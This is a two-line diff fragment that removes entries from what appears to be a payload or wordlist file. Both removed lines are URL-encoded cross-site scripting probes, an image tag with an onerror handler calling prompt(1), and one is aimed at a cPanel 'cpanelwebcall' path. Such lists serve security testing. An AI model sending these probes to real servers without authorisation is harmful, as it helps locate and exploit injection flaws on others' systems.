@@ -1,2 +1,0 @@
-cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa
-<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa
